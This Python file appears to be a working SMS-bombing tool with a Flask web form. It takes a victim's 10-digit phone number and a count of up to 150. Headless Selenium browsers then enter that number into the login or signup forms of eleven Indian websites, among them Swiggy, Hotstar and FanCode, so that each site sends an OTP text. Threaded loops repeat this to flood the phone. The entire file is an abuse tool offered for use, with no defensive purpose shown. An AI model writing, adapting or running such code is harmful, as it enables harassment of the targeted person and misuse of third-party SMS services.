from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import threading
from flask import Flask,render_template,request


            
def swiggy(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://www.swiggy.com")
    time.sleep(2)
    driver.find_element(By.XPATH,"""//*[@id="root"]/div[1]/div[1]/div/div[1]/div[1]/div/div[1]/div/a[1]""").click()
    time.sleep(2)
    inpu = driver.find_element(By.XPATH,"""/html/body/div[2]/div/div/div[2]/div/div/div/form/div[1]/div/input""")
    inpu.send_keys(number)
    inpu.send_keys(Keys.ENTER)
    time.sleep(1)
    
    
def hotstar(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://www.hotstar.com/in/mypage")
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/div/div[3]/div/div[3]/div[1]/div/div[3]/div/button/span/span""").click()
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/div[3]/div[2]/div/div/div[2]/div/div/div[1]/div/div/form/div[2]/div/div[1]/div[1]/div/div[2]/div/input""")
    inp.send_keys(number)
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/div[3]/div[2]/div/div/div[2]/div/div/div[1]/div/div/form/div[2]/div/div[2]/div/div/button""").click()
    time.sleep(1)
    
    
def sketchers(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://www.skechers.in/login/")
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/div[4]/div/div/div[2]/div[2]/div/button[2]""").click()
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/div[1]/div[1]/div[2]/div/div[1]/div/div[2]/div[2]/a""").click()
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/div[1]/div[1]/div[2]/div/div/form[1]/div[1]/input""")
    inp.send_keys(number)
    inp.send_keys(Keys.ENTER)
    time.sleep(1)
    

def indiamart(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://my.indiamart.com/")
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/div[2]/div/div/div[2]/input[1]""")
    inp.send_keys(number)
    inp.send_keys(Keys.ENTER)
    time.sleep(1.5)
    driver.find_element(By.XPATH,"""/html/body/div[3]/div[1]/div/div/div/div[2]/div[2]/div/div[3]/div[5]""").click()
    time.sleep(1.5)
    driver.find_element(By.XPATH,"""/html/body/header/div[5]/div[2]/center/div/div/div[2]/div[1]/a""").click()
    time.sleep(1.5)
    
    
def magicpin(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://magicpin.in/New-Delhi/search/?utm_campaign=%24suggester&utm_medium=suggester&utm_source=search&collapse=false&suggestion_id=Bata_1&query=Bata&versionCode=5001&addNewPage=true&suggestion_type=FRANCHISE&search_tab=STORES&searchTitle=Bata&latitude=28.6304&longitude=77.2177")
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/header/div/section/div[2]/div[1]/div/div[1]/button""").click()
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/div[15]/div[3]/div/span/input""")
    inp.send_keys(number)
    inp.send_keys(Keys.ENTER)
    time.sleep(2)
    
    
def walletly(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://walletly.in/login/")
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/div/div[2]/main/div/div/input""")
    inp.send_keys(number)
    driver.find_element(By.XPATH,"""/html/body/div/div[2]/main/div/button""").click()
    time.sleep(1)
    

def watcho(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://www.watcho.com/signin")
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/ott-app/div/div/div/ott-signin/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/form/input""")
    inp.send_keys(number)
    inp.send_keys(Keys.ENTER)
    time.sleep(3)
    
    
def mywalletly(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://www.mywalletly.com/login")
    time.sleep(2)
    inp = driver.find_element(By.XPATH,"""/html/body/div/main/div/form/div/input""")
    inp.send_keys(number)
    inp.send_keys(Keys.ENTER)
    time.sleep(1)
    
def winds(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://windsapp.com/signup")
    time.sleep(1.5)
    driver.find_element(By.XPATH,"""/html/body/div[1]/div[4]/div/div[1]/div/div/div/input""").send_keys(number)
    time.sleep(1.5)
    driver.find_element(By.XPATH,"""/html/body/div[1]/div[4]/div/div[1]/div/button""").click()
    time.sleep(2)

def fancode(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://www.fancode.com/login")
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/div[2]/div/div/div/div/div[2]/div[3]/div[1]/input""").send_keys(number)
    time.sleep(1.5)
    driver.find_element(By.XPATH,"""/html/body/div[2]/div/div/div/div/div[2]/div[3]/div[1]/button""").click()
    time.sleep(2)
def infinitylearn(number):
    chrome = webdriver.ChromeOptions()
    chrome.add_argument("--headless")
    chrome.add_argument("--no-sandbox")
    chrome.add_argument("--disable-dev-shm-usage")
    chrome.add_argument("log-level=3")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome)
    driver.get("https://student.infinitylearn.com/signup?page=signup")
    time.sleep(2)
    driver.find_element(By.XPATH,"""/html/body/app-root/app-default-layout/div/app-sign-in/div/div/div/div[2]/div[2]/div[1]/div/div/div[1]/div/div/input""").send_keys(number)
    driver.find_element(By.XPATH,"""/html/body/app-root/app-default-layout/div/app-sign-in/div/div/div/div[2]/div[2]/div[1]/div/div/div[2]/div/input""").send_keys("ufsguigsdugk")
    driver.find_element(By.XPATH,"""/html/body/app-root/app-default-layout/div/app-sign-in/div/div/div/div[2]/div[2]/div[1]/div/div/div[3]/div/input""").send_keys("ufsguifhgsdugk")
    time.sleep(1.5)
    driver.find_element(By.XPATH,"""/html/body/app-root/app-default-layout/div/app-sign-in/div/div/div/div[2]/div[2]/div[1]/div/div/div[4]/ul/li[1]/label/div""").click()
    driver.find_element(By.XPATH,"""/html/body/app-root/app-default-layout/div/app-sign-in/div/div/div/div[2]/div[2]/div[1]/div/div/div[7]/button""").click()
    time.sleep(2)     
i=0

def main(number,tim):
    i=0
    print(f"sms sent successful: {i}")
    while i<tim:
        try:
            if i>10:
                r10.join()
                r11.join()
            r1=threading.Thread(target=swiggy,args=(number,))
            r1.start()
            i=i+1
            print(f"sms sent successful: {i}")
        except:
            pass
        try:
            if i<tim:
                r2=threading.Thread(target=hotstar,args=(number,))
                r2.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r3=threading.Thread(target=watcho,args=(number,))
                r3.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r1.join()
                r2.join()
                r3.join()
                r4=threading.Thread(target=walletly,args=(number,))
                r4.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r5=threading.Thread(target=magicpin,args=(number,))
                r5.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r6=threading.Thread(target=indiamart,args=(number,))
                r6.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r4.join()
                r5.join()
                r6.join()
                r7=threading.Thread(target=sketchers,args=(number,))
                r7.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r8=threading.Thread(target=mywalletly,args=(number,))
                r8.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r9=threading.Thread(target=winds,args=(number,))
                r9.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r7.join()
                r8.join()
                r9.join()
                r10=threading.Thread(target=fancode,args=(number,))
                r10.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        try:
            if i<tim:
                r11=threading.Thread(target=infinitylearn,args=(number,))
                r11.start()
                i=i+1
                print(f"sms sent successful: {i}")
            else:
                break
        except:
            pass
        
        
app=Flask(__name__)
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/success',methods=['POST'])
def send():
    number=request.form['number']
    tim=(int)(request.form['messages'])
    if len(number)!=10:
        return render_template('home.html',info="INVALID NUMBER",tim=tim)
    elif(tim>150):
        return render_template("home.html",info="MAXIMUM 150 ONLY",number=number)
    else:
        m1=threading.Thread(target=main,args=(number,tim,))
        m1.start()
        return render_template('success.html')

if __name__=='__main__':
    app.run(debug=True)